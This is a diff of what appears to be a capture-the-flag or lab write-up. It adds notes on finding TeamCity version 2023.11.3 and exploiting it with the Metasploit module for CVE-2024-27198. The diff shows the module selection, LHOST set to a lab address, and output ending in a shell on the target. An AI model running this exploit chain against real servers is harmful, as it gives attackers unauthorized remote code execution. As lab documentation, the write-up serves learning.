@@ -55,9 +55,18 @@ There is one login page on port `50000`
 
 ![](../../../assets/images/Pasted%20image%2020251101170127.png)
 
-I just Noticed Version 2023.11.3
+I just Noticed Version `2023.11.3` so searched it immediately and found this on rapid7
 
 ![](../../../assets/images/Pasted%20image%2020251101170143.png)
+
+then just searched on `msfconsole` and found it :
+
+![](../../../assets/images/Pasted%20image%2020251101183337.png)
+
+---
+# Exploitation
+
+i used 4th module from above list : 
 
 ```bash
 [msf](Jobs:0 Agents:0) exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) >> set LHOST 10.8.31.47
@@ -77,4 +86,5 @@ LHOST => 10.8.31.47
 [!] This exploit may require manual cleanup of '/opt/teamcity/TeamCity/webapps/ROOT/plugins/m7WplZt9' on the target
 ```
 
-we got shell
+and i got shell : 
+
